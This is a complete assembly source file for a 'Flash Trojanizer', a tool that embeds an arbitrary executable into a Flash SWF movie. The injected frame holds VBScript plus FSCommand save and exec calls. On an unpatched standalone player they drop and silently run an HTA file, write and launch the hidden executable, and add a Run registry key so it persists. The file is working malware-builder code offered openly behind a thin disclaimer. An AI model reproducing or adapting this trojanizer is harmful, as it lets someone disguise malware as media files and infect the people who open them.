; ---------------------[ Flash.asm ]---------------------


; Title: 	Flash Trojanizer Utility - Version 1.0
; Motto:	Putting Theory Into Practice
; Platform:	Win9X/NT/2000/XP
; FileSize:	8K (Flash.exe)


; DISCLAIMER:
; ===========
; If you use this demo to create a malicious movie (.swf, .spl or .exe)
; and/or distribute it to any system where it does not belong
; you alone will be responsible for your actions.
;
; This demo is strictly intended for educational purposes only. Enjoy! 


; Macromedia Flash movies that contain malicious code:
; ====================================================
; Here's an interesting statement by Macromedia:
;
; "While never reported in the wild, it is THEORETICALLY possible for a Macromedia
; Flash projector or a Macromedia Flash movie played through the Macromedia
; Flash standalone player on a Windows operating system to perform malicious
; acts. This risk only occurs when malicious content is played back in a
; standalone Macromedia Flash Player and does not affect movies playing in a browser.
;
; Again, this is only a theoretical issue, and has not been experienced in the wild."


; Theoretical Definition:
; =======================
; Confined to theory or speculation often in contrast to practical applications.


; How it works - Putting Theory Into Practice:
; ============================================
; This simple utility will create trojanized Flash .SWF movies.
;
; It looks for VIRUS.EXE and HOST.SWF in the current folder and
; will merge them together to create a trojan called VIRHOST.SWF!
; The trojan movie now contains the embedded virus code represented
; internally as a hex dump stored within a vbscript array.
;
; For example, when VIRHOST.SWF is played through an unpatched
; Macromedia Flash 5 standalone player, it does the following:
;
; 1) Drops an M$ html application host file into 'c:\temp.hta'.
; 2) Executes it silently using: 'mshta.exe c:\temp.hta'.
; 3) The 'temp.hta' drops the embedded viral code into 'c:\%windir%\virus.exe'.
; 4) Next, the 'virus.exe' is run automatically.
; 5) Also, a "virus" registry key is created in 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
;    with the string value = 'c:\%windir%\virus.exe'.


; Limitations: 
; ============
; 1) Dependent upon 'mshta.exe' existing on windows machines.
;    It's located in the system directory:
;
;    Win9X:	---> c:\windows\system
;    WinNT/2000:---> c:\winnt\system32
;    WinXP:	---> c:\windows\system32
;
; 2) Total embedded viral code is restricted to <= 65,535 bytes.
;    Reason: Flash movies can only PUSH 65535 bytes of data.
; 3) Hardcoded the path 'c:\...' because mshta.exe requires a specific known path. ;(
; 4) The 'c:\temp.hta' file is present after infection. (It should be removed)


; Notes:
; ======
; This utility is written in 32 bit assembly, thus no corruption occurs when merging large SWF files.
; The trojan dropping mechanism is efficient and not too obvious to the user. :)
; The VBSCRIPT code can easily be modified without having to update the .code body.
; Also, VIRHOST.SWF can be converted to VIRHOST.EXE using the 'Create Projector' 
; menu item from an unpatched FLASHPLA.EXE windows Flash 5 standalone player.


; The Future:
; ===========
; Beware of .SWF, .SPL or .EXE Flash movies!



; ---------------------[ Let the games begin! ]---------------------


; Assemble with Tasm v5.0:
; ========================
; tasm32 /mx /m3 /z /q Flash
; tlink32 -x /Tpe /aa /c Flash,Flash,, import32.lib


; ---------------------[ Begin Trojanizer ]---------------------

.386p
locals
jumps
.model flat, stdcall


; ---------------------[ API Equates ]---------------------

MB_OK			equ 0
HWND			equ 0
NULL			equ 0
GMEM_FIXED		equ 0
FILE_BEGIN              equ 0
CREATE_ALWAYS		equ 2
OPEN_EXISTING		equ 3
INVALID_HANDLE_VALUE    equ -1
FILE_ATTRIBUTE_NORMAL	equ 80h
GENERIC_READ		equ 80000000h
GENERIC_WRITE		equ 40000000h


; ---------------------[ API Functions ]---------------------

extrn     ExitProcess      : PROC 
extrn     MessageBoxA      : PROC 
extrn     CreateFileA      : PROC 
extrn	  ReadFile 	   : PROC
extrn	  WriteFile	   : PROC 
extrn	  CloseHandle	   : PROC 
extrn     GetFileSize	   : PROC 
extrn	  GlobalAlloc	   : PROC 
extrn	  GlobalFree	   : PROC 
extrn     SetFilePointer   : PROC


.data


; ---------------------[ Messages ]---------------------

caption  	db "Flash Trojanizer!",0
text		db "Welcome!",13,10,13,10     	
		db "This program will create trojanized Flash movies.",13,10
	 	db "It looks for VIRUS.EXE and HOST.SWF in the current directory and",13,10
	 	db "will merge them together to create a trojan called VIRHOST.SWF!",13,10,13,10
	 	db "Peace thru superior cyber power!",0                        	    				
err_cap  	db "D'Oh!",0
open_err	db "File VIRUS.EXE or HOST.SWF not found!",0	
create_err	db "Unable to create the VIRHOST.SWF file!",0
invalid_swf_err db "Invalid HOST.SWF header!",0	
virus_too_large	db "Sorry, the VIRUS.EXE file is too large to be embedded into the host!",13,10
		db "Try compressing it to approx: "
num		db 5 dup('0')," bytes or less.  Thanks.",0	
memerr	 	db "Error on allocating memory.",0  					    					 
donecap 	db "Done!",0
donetxt		db "VIRHOST.SWF has been successfully created!",0		


; ---------------------[ Variables ]---------------------
  
hex		db "0123456789ABCDEF"
swf_filename	db "host.swf",0        
exe_filename	db "virus.exe",0  
vir_filename	db "virhost.swf",0
fhandle_swf	dd ?			
fhandle_exe	dd ?	
fhandle_vir	dd ?
fsize_swf	dd ?	
fsize_exe	dd ?
memptr	 	dd ?	
memptr_exe 	dd ?		
bytes_read	dd ?	
bytes_write   	dd ?	
total_mem_size	dd ?
three		dw 3
ten		dw 10


; ---------------------[ SWF Header ]---------------------

sign_fw		dw ?		
sign_s		db ?
version_num	db ?
file_length	dd ?
static_hdr_size	equ $-sign_fw
rect_buf	db 20 dup(0)
rect_buf_size	equ $-rect_buf
swf_hdr_size 	dd ?				; Holds the true header size!


; ---------------------[ SWF Viral Frame ]---------------------

frame_size	equ (end_frame - begin_frame)

begin_frame:

do_action_tag	db 3fh,03h			; DoAction Tag
action_len	dd ?				; Total action size
							
push_var	db 96h				; Push Data
push_var_len	dw ?				; Length
push_var_type	db 00h				; Null-terminated string
		db 'v'				; Timeline variable name
		db 00h				; End string
var_size	equ $-push_var_type

push_str	db 96h				; Push Data
push_str_len	dw ?				; Virus code must be < 65,535
push_str_type	db 00h				; Null-terminated string


; ---------------------[ VBSCRIPT Begin ]---------------------

str_name	db '<script language=vbs>Set o=CreateObject(',22h,'Scripting.FileSystemObject',22h,')',0dh,0ah
		db 'Set s=CreateObject(',22h,'WScript.Shell',22h,')',0dh,0ah
		db 'p=s.ExpandEnvironmentStrings(',22h,'%WinDir%\virus.exe',22h,')',0dh,0ah
		db 'If not o.FileExists(p) Then',0dh,0ah
		db 't=Split(',22h
		drop_begin_size	equ $-do_action_tag		
		drop_middle:			; XX,...,XX = (sizeof(virus.exe)*3-1)	
		db 22h,',',22h,',',22h,')',0dh,0ah
		db 'Set f=o.CreateTextFile(p,2)',0dh,0ah
		db 'For i=0 To UBound(t)',0dh,0ah
		db 'f.Write chr(Int(',22h,'&H',22h,'&t(i)))',0dh,0ah
		db 'Next',0dh,0ah
		db 'f.Close',0dh,0ah
		db 's.run(p)',0dh,0ah
		db 's.RegWrite ',22h,'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\virus',22h,',p,',22h,'REG_SZ',22h,0dh,0ah
		db 'End If',0dh,0ah
		db 'close()</script>',0dh,0ah
		
; ---------------------[ VBSCRIPT End ]---------------------


str_end		db 00h				; End string
str_size	equ $-push_str_type

fscommands	db 1dh				; Start of FSCommands?

get_save	db 83h				; ActionGetUrl Tag
get_save_len	dw ?				; FSCommand("save"...) length
save		db 'FSCommand:save'		; Save Action
		db 00h				; End string
		db 'c:\temp.hta'		; Create file 'temp.hta'
		db 00h				; End string
save_size	equ $-save

get_exec	db 83h				; ActionGetUrl Tag
get_exec_len	dw ?				; FSCommand("exec"...) length
exec		db 'FSCommand:exec'		; Exec Action
		db 00h				; End string
		db 'mshta.exe',09h,'c:\temp.hta'; Execute the M$ html 'temp.hta'
		db 00h				; End string
exec_size	equ $-exec

tag_showframe	db 01h				; End of viral frame. Very important!

action_size	equ $-push_var
drop_end_size	equ $-drop_middle

end_frame:

; ---------------------[ End Viral Frame ]---------------------


.code


; ---------------------[ Start Trojanizer ]---------------------

Main:
	push	MB_OK              
        push	offset caption     
        push	offset text        
        push	HWND               
        call	MessageBoxA        		; Display introduction message.

        push	NULL				
	push	FILE_ATTRIBUTE_NORMAL		
	push	OPEN_EXISTING			
	push	NULL				
	push	NULL				
	push	GENERIC_READ + GENERIC_WRITE
	push	offset swf_filename
        call	CreateFileA			; Open HOST.SWF file.  
               
	cmp 	eax,INVALID_HANDLE_VALUE			
	je 	no_file
	
	mov 	fhandle_swf,eax			; Save .swf handle.

        push	NULL				
	push	FILE_ATTRIBUTE_NORMAL		
	push	OPEN_EXISTING			
	push	NULL				
	push	NULL				
	push	GENERIC_READ + GENERIC_WRITE
	push	offset exe_filename
        call	CreateFileA			; Open VIRUS.EXE file.

	cmp 	eax,INVALID_HANDLE_VALUE		
	jne 	continue

no_file:
        push	MB_OK              
        push	offset err_cap     
        push	offset open_err     
        push	HWND               
        call	MessageBoxA        		; Display file not found message.
        
	jmp  	close_handles			 	

continue:		
	mov 	fhandle_exe,eax			; Save .exe handle.
	
	push	NULL				
	push	offset bytes_read			
	push	(static_hdr_size+rect_buf_size)	
	push	offset sign_fw			
	push	fhandle_swf			
	call	ReadFile			; Read the SWF file header.
	
	mov	ecx,rect_buf_size		
	xor	edi,edi
next_byte:					; Check for a valid Flash SWF file.
	cmp	byte ptr rect_buf[edi],43h	; Search for the SetBackgroundColor Tag (43,02,XX,XX,XX).
	jne	not_found_tag			; Seems to always exist directly after the header. ;)
	cmp	byte ptr rect_buf[edi+1],02h
	je	found_tag
	
not_found_tag:
	inc	edi
	dec	ecx
	jnz	next_byte
	
	push	MB_OK              
	push	offset err_cap     
	push	offset invalid_swf_err     
	push	HWND               
	call	MessageBoxA        		; Display invalid HOST.SWF header message.
	
	jmp  	close_handles	
		
found_tag:		
	lea	edi,[edi+static_hdr_size]
	mov	swf_hdr_size,edi		; Compute the SWF header size.

	lea	edi,[edi+sign_fw]
	inc	word ptr [edi-2]		; Increase Frame count by 1.

	push	NULL
	push	fhandle_swf
	call	GetFileSize			; Get HOST.SWF filesize.
	mov	fsize_swf,eax		
	
	push	NULL
	push	fhandle_exe
	call	GetFileSize			; Get VIRUS.EXE filesize.
	mov	fsize_exe,eax			

	lea	ecx,[(eax+eax*2)+str_size-1]
	cmp	ecx,0000ffffh
	jle	vir_ok				; Virus too large? > 65,535 bytes.

	xor	edx,edx				; Compute the max. size in bytes for VIRUS.EXE.
	mov	eax,(0ffffh-str_size+1)
	div	three
	xor	ecx,ecx
	mov	edi,offset num
next_div:
	xor	edx,edx
	div	ten
	push	edx
	inc	ecx
	test	eax,eax
	jnz	next_div
out_sym:
	pop	edx
	add	dl,'0'
	mov	byte ptr [edi],dl
	inc	edi
	dec	ecx
	jnz	out_sym
	
	push	MB_OK              
	push	offset err_cap     
	push	offset virus_too_large   
	push	HWND               
	call	MessageBoxA        		; Display invalid virus size message.
	
	jmp  	close_handles	
	
vir_ok:						
	lea	ebx,[(eax+eax*2)+action_size-1]	; Update the ? uninitialized variables above.
	mov	[action_len],ebx
	mov	[push_var_len],var_size 
	mov	[push_str_len],cx	
	mov	[get_save_len],save_size
	mov	[get_exec_len],exec_size
						; Compute total memory allocation size:
	lea	eax,[(eax+eax*2)+frame_size-1]	; ((virus.exe * 3) - 1) + (host.swf) + (swf_frame_size) bytes.
	add	eax,fsize_swf			; The "-1" removes the comma from the last hex XX value.								
											
	mov	total_mem_size,eax		; Store total memory size required.
	mov	[file_length],eax		; Store new file length for VIRHOST.SWF!
	
	push	total_mem_size				
	push 	GMEM_FIXED			
	call 	GlobalAlloc			; Allocate memory block. 

	test	eax,eax		
	jz	memory_bad
	
	mov  	memptr,eax			; Save pointer to memory area.
	
	push	fsize_exe			
	push 	GMEM_FIXED			
	call 	GlobalAlloc			; Allocate EXE memory block. 

	test	eax,eax		
	jz	memory_bad	
	
	mov  	memptr_exe,eax			; Save pointer to EXE memory area.

	push 	NULL			
	push 	offset bytes_read	
	push 	fsize_exe		
	push	memptr_exe
	push 	fhandle_exe		
	call 	ReadFile			; Read VIRUS.EXE into memory.	
	
	jmp	memory_ok
	
memory_bad:	
        push 	MB_OK              
        push 	offset err_cap     
        push 	offset memerr      
        push 	HWND               
	call 	MessageBoxA			; Display memory allocation error message.
	
        jmp  	close_handles		


; Construct this memory image and write it to the new VIRHOST.SWF file:

; +----------------+ 
; | SWF header     |
; +----------------+
; | Viral Frame    |
; +----------------+
; | Host Code      |
; +----------------+
	
; EDI points to start of memory block.
; ESI points to start of memory VIRUS.EXE block.


memory_ok:		
	mov	edi,memptr
	
	mov	esi,offset sign_fw
	mov	ecx,swf_hdr_size
	cld
	rep	movsb				; Copy SWF header.
	
	mov	esi,offset do_action_tag
	mov	ecx,drop_begin_size
	cld
	rep	movsb				; Copy begin of viral frame.

	mov	esi,memptr_exe			
	mov	ecx,fsize_exe	
ToHex:	
	mov	ebx,offset hex			
	mov	al,byte ptr [esi]
	mov	ah,al
	and	al,00001111b
	xlat
	mov	byte ptr [edi+2],','		; Copy middle of viral frame.
	mov	byte ptr [edi+1],al
	shr	ax,12
	xlat
	mov	byte ptr [edi+0],al
	inc	esi
	inc	edi
	inc	edi
	inc	edi
	dec	ecx
	jnz	ToHex
	
	dec	edi				; Remove the extra comma from the hex string.
	
	mov	esi,offset drop_middle
	mov	ecx,drop_end_size
	cld
	rep	movsb				; Copy end of viral frame.

	push	FILE_BEGIN			
        push	NULL
        push	swf_hdr_size
        push	fhandle_swf
        call	SetFilePointer			; Set file ptr right after Flash header.
        
        mov 	ecx,fsize_swf	
	sub 	ecx,swf_hdr_size
	push 	NULL			
	push 	offset bytes_read	
	push 	ecx	
	push	edi
	push 	fhandle_swf		
	call 	ReadFile			; Copy remaining host code into memory.	

        push	NULL				
        push	FILE_ATTRIBUTE_NORMAL		
        push	CREATE_ALWAYS			
        push	NULL				
        push	NULL				
        push	GENERIC_READ + GENERIC_WRITE
        push	offset vir_filename
        call	CreateFileA			; Create VIRHOST.SWF file.
        
	cmp 	eax,INVALID_HANDLE_VALUE	
	jne 	write_trojan
	
        push 	MB_OK              
        push 	offset err_cap     
        push 	offset create_err      
        push 	HWND               
	call 	MessageBoxA			; Display file create failed message.
	
	jmp	close_all
	
write_trojan:
	mov 	fhandle_vir,eax
	
        push 	NULL		
        push 	offset bytes_write	
        push 	total_mem_size	
        push 	memptr	
        push 	eax		
        call 	WriteFile			; Write entire viral memory image to VIRHOST.SWF! :)
	
        push 	MB_OK 
        push 	offset donecap  
        push 	offset donetxt
	push 	HWND
        call 	MessageBoxA        		; Display message that the trojan has been created!

close_all:					; Cleanup and exit process.
	push	memptr
	call	GlobalFree		
	
	push	memptr_exe
	call	GlobalFree
	
close_handles:
	push 	fhandle_swf	
	call 	CloseHandle	
		
	push 	fhandle_exe	
	call 	CloseHandle
	
	push 	fhandle_vir
	call 	CloseHandle	

end_prog:
	push	NULL
        call    ExitProcess
        
End Main					; Wasn't that fun!? :)

; ---------------------[ End Trojanizer ]---------------------